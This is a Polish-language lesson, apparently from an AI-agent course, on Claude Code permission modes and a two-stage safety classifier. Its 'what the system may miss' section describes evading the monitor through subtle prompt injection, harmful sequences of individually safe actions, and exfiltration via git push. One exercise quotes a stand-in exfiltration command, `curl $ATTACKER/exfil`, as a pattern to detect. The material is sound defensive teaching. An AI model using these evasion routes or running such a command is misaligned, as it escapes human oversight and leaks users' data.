# Claude Code jako agent autonomiczny: tryby uprawnień i tryb automatyczny

> Claude Code udostępnia siedem trybów uprawnień. „plan” pyta przed każdą akcją, „default” pyta tylko o ryzykowne, „acceptEdits” automatycznie zatwierdza zapisy plików, ale nadal potwierdza wykonanie powłoki, a „bypassPermissions” zatwierdza wszystko. Tryb automatyczny (24 marca 2026 r.) zastępuje zatwierdzanie poszczególnych działań dwustopniowym równoległym klasyfikatorem bezpieczeństwa: szybka kontrola z jednym tokenem przeprowadzana jest w przypadku każdej akcji; Oznaczone działania rozpoczynają głęboką analizę łańcucha myśli. Budżety działań są egzekwowane poprzez `max_turns` i `max_budget_usd`. Tryb automatyczny dostarczony jako podgląd badawczy — firma Anthropic wyraźnie stwierdziła, że ​​sam klasyfikator nie wystarczy.

**Typ:** Ucz się
**Języki:** Python (stdlib, dwustopniowy symulator klasyfikatora)
**Wymagania wstępne:** Faza 15 · 01 (Agenci o długim horyzoncie), Faza 15 · 09 (Krajobraz agenta kodującego)
**Czas:** ~45 minut

## Problem

Autonomiczny agent kodujący na Twojej maszynie to odrębna kategoria zabezpieczeń. Powierzchnią ataku jest wszystko, do czego agent może dotrzeć — system plików, sieć, dane uwierzytelniające, schowek, dowolna karta przeglądarki lub dowolny otwarty terminal. Bruce Schneier i inni zasygnalizowali to publicznie: agenci korzystający z komputera nie są „aktualizacją funkcji” chatbotów, lecz nowym rodzajem narzędzia z nowym rodzajem profilu ryzyka.

System uprawnień Claude Code jest odpowiedzią Anthropic. Zamiast jednego przełącznika „autonomiczny/nie autonomiczny” istnieje siedem trybów obejmujących drabinę możliwości: plan → domyślny → akceptowanie edycji → … → obejście uprawnień. Każdy tryb to inny kompromis między szybkością a oceną na akcję. W trybie automatycznym (marzec 2026 r.) dodano dwustopniowy klasyfikator, który przesuwa zatwierdzanie ze ścieżki krytycznej użytkownika w przypadku działań uznawanych przez klasyfikator za bezpieczne, zachowując jednocześnie warstwę przeglądu dla działań oznaczonych przez klasyfikator.

Pytanie inżynierskie: co ten system wyłapuje, co przeoczy i na jaki tryb faktycznie pozwala dane zadanie?

## Koncepcja

### Siedem trybów uprawnień

| Tryb | Zachowanie | Kiedy używać |
|---|---|---|
| `plan` | Agent proponuje plan; użytkownik zatwierdza cały plan; każda akcja jest sprawdzana przed wykonaniem | Nieznane zadanie; kod sąsiadujący z prodem; pierwsze użycie agenta na repo |
| `default` | Agent uruchamia akcje; pyta użytkownika o wszelkie „ryzykowne” działania (wykonywanie powłoki, operacje destrukcyjne, wywołania sieciowe) | Najbardziej interaktywne sesje kodowania |
| `acceptEdits` | Plik zapisuje automatyczne zatwierdzanie; Shell Exec i wywołania sieciowe nadal wyświetlają monit | Refaktoryzacja przechodzi przez wiele plików |
| `acceptExec` | Polecenia powłoki automatycznie zatwierdzają się na wybranej liście dozwolonych; pisze automatyczne zatwierdzanie | Ciasne wewnętrzne pętle, w których każde polecenie powłoki ma wartość `npm test` lub podobną |
| `autoMode` | Dwustopniowy klasyfikator bezpieczeństwa; oznaczone działania przekaż do przeglądu | Długofalowe prace bez nadzoru w ograniczonej przestrzeni roboczej |
| `yolo` | Pomija większość podpowiedzi; nadal uruchamia narzędzie lista dozwolonych/lista odrzuconych | Efemeryczne piaskownice, zadania CI, skrypty badawcze |
| `bypassPermissions` | Zatwierdza wszystko | Udokumentowane jako „tylko w efemerycznych pojemnikach, które jesteś skłonny wyrzucić” |

(Nazwy powyżej odpowiadają publicznym dokumentom Claude Code; „yolo” to nieformalny skrót oznaczający permisywny środek.)

### Tryb automatyczny na jednej stronie

Tryb automatyczny (uruchomiony 24 marca 2026 r.) to pierwszy tryb uprawnień, który umożliwia delegowanie modelowi zatwierdzania poszczególnych działań. Struktura:

1. **Etap 1 — klasyfikator jednotokenowy.** Działa na każdej zaproponowanej akcji. Tani. Zwraca wartość „bezpieczny” lub „flaga”. Zaprojektowany do działania równolegle z główną pętlą agenta, dzięki czemu zatwierdzone działania nie czekają w kolejce.
2. **Etap 2 — wtórny przegląd zasad/bezpieczeństwa.** Działa tylko w przypadku oznaczonych działań. Wykonuje ukierunkowaną ocenę zasad i bezpieczeństwa działania, bieżącego stanu sesji i zadeklarowanego zadania. Eskaluje do użytkownika HITL, jeśli pewność jest niska.

Kontrola budżetu odbywa się obok klasyfikatora:

- `max_turns` — całkowita liczba iteracji w sesji.
- `max_budget_usd` — limit dolara, który przerywa sesję.
- limity liczby akcji na narzędzie (nie więcej niż N `WebFetch` wywołań itp.).

### Co wychwytuje system

- Proste, natychmiastowe wstrzykiwanie do danych wejściowych narzędzia, gdzie wstrzykiwana instrukcja jest odwzorowywana na znany, ryzykowny kształt działania.
- Powtarzające się pętle narzędzi — klasyfikator może zobaczyć, że akcja N+1 jest prawie identyczna z akcją N, pięć razy z rzędu.
- Polecenia powłoki wyraźnie wykraczające poza zakres sesji przeznaczonej wyłącznie do edycji plików.

### Czego system może przeoczyć

- **Subtelny zastrzyk natychmiastowy**, który moduluje zachowanie bez powodowania ani jednej oznaczonej akcji. Pośrednie wprowadzenie monitu nie jest luką, którą można w pełni załatać (szef przygotowania OpenAI, 2025, dotyczący agentów przeglądarki — zobacz Lekcja 11).
- **Niewłaściwe zachowanie na poziomie semantycznym.** Każde indywidualne działanie może wyglądać na bezpieczne, podczas gdy ułożona trajektoria jest szkodliwa. Klasyfikator ocenia działanie; nie odczytuje intencji użytkownika.
- **Eksfiltracja legalnymi kanałami.** Zapisywanie danych do posiadanego pliku, a następnie `git push`do publicznego repozytorium to sekwencja dozwolonych działań, których skład stanowi problem.

### Kadrowanie podglądu badań

Anthropic dostarczył tryb automatyczny jako podgląd badawczy. Z dokumentacji wyraźnie wynika, że ​​klasyfikator jest warstwą, a nie rozwiązaniem: od użytkowników oczekuje się łączenia trybu automatycznego z budżetami, listami dozwolonych, izolowanymi obszarami roboczymi i audytami trajektorii (lekcje 12–16). Ramka podglądu odzwierciedla również udokumentowaną lukę pomiędzy oceną a wdrożeniem (lekcja 1) — klasyfikator, który przechodzi ewaluacje w trybie offline, może zachowywać się inaczej w prawdziwej sesji, w której kontekst użytkownika jest niejednoznaczny.

### Gdzie ta drabina znajduje się w Twoim przepływie pracy

- Nieznane zadanie: rozpocznij w `plan`. Przeczytanie planu jest tańsze niż wycofanie się ze złej passy.
- Znany refaktor: `acceptEdits` pozwala zaoszczędzić wiele kliknięć potwierdzających.
- Uruchamianie w tle bez nadzoru: `autoMode` tylko w obszarze roboczym, którego promień wybuchu został zmierzony (bez poświadczeń, bez wierzchowców produkcyjnych, bez wyjścia, na które nie wyraziłeś zgody).
- Kontenery efemeryczne: `yolo` / `bypassPermissions` są dopuszczalne wtedy i tylko wtedy, gdy kontener i jego dane uwierzytelniające są jednorazowe.

## Użyj tego

`code/main.py` symuluje klasyfikator dwustopniowy. Etap 1 to tania reguła dotycząca słów kluczowych dotycząca proponowanych działań; Etap 2 to wolniejszy przegląd wielu reguł. Sterownik podaje krótką syntetyczną trajektorię (bezpieczne działania, próba natychmiastowego wstrzyknięcia, powtarzalna pętla) i pokazuje, gdzie klasyfikator łapie, a gdzie nie.

## Wyślij to

`outputs/skill-permission-mode-picker.md` dopasowuje opis zadania do odpowiedniego trybu uprawnień, limitów budżetu i wymaganej izolacji.

## Ćwiczenia

1. Uruchom `code/main.py`. Który rodzaj akcji syntetycznej nigdy nie jest oznaczany na Etapie 1, ale zawsze przechwytywany na Etapie 2? Który nie jest złapany przez żadnego?

2. Rozszerz zestaw reguł Etapu 1, aby wychwycić konkretny, znany-zły kształt (np. `curl $ATTACKER/exfil`). Zmierz odsetek wyników fałszywie dodatnich w próbce o łagodnym działaniu.

3. Przeczytaj dokument firmy Anthropic „Jak działa pętla agenta”. Wyświetl listę wszystkich stanów zewnętrznych, których agent dotyka domyślnie w trybie `default`. Które elementy musiałbyś oddzielnie bramkować przed uruchomieniem `autoMode` bez nadzoru?

4. Zaprojektuj budżet na 24 godziny na uruchamianie bez nadzoru: `max_turns`, `max_budget_usd`, limity poszczególnych narzędzi, listy dozwolonych. Uzasadnij każdą liczbę.

5. Opisz jedną trajektorię, w której każde indywidualne działanie jest akceptowane na Etapie 1 i Etapie 2, ale skomponowane zachowanie jest źle dopasowane. (W lekcji 14 omówiono, jak rozwiązują ten problem przełączniki zabijania i żetony kanarkowe.)

## Kluczowe terminy

| Termin | Co ludzie mówią | Co to właściwie oznacza |
|---|---|---|
| Tryb uprawnień | „Ile agent może zrobić” | Jedna z siedmiu nazwanych zasad kontrolujących zatwierdzanie poszczególnych akcji |
| tryb planu | „Zapytaj przed czymkolwiek” | Agent pisze plan; użytkownik zatwierdza przed wykonaniem |
| zaakceptujEdycje | „Niech zapisuje pliki” | Plik zapisuje automatyczne zatwierdzanie; Shell Exec nadal wyświetla monit |
| tryb automatyczny | „Automatyczne homologacje” | Dwustopniowy klasyfikator bezpieczeństwa; oznaczone działania nasilają się |
| obejścieUprawnień | „Pełne YOLO” | Zatwierdza wszystko; przeznaczone do pojemników efemerycznych |
| Klasyfikator etapu 1 | „Szybkie sprawdzenie tokena” | Reguła pojedynczego tokenu dotycząca proponowanej akcji; biegnie równolegle |
| Klasyfikator etapu 2 | „Głęboka recenzja” | Rozumowanie oparte na łańcuchu myślowym dotyczące oznaczonych działań |
| Podgląd badań | „Nie GA” | Ramowanie antropiczne dla obiektów, których tryb awarii jest wciąż mapowany |

## Dalsze czytanie

- [Anthropic — Jak działa pętla agenta](https://code.claude.com/docs/en/agent-sdk/agent-loop) — tryby uprawnień, budżety, format akcji.
- [Anthropic — przegląd agentów zarządzanych przez Claude](https://platform.claude.com/docs/en/managed-agents/overview) — model wykonywania usług zarządzanych.
– [Anthropic — strona produktu Claude Code](https://www.anthropic.com/product/claude-code) — powierzchnia funkcji i ogłoszenie w trybie automatycznym.
– [Anthropic — Konstytucja Claude’a (styczeń 2026 r.)](https://www.anthropic.com/news/claudes-constitution) — warstwa oparta na przyczynach, która kształtuje sądy klasyfikatorów.
- [Anthropic — Pomiar autonomii agentów w praktyce](https://www.anthropic.com/research/measuring-agent-autonomimy) — wewnętrzne spojrzenie na projektowanie pozwoleń długohoryzontalnych.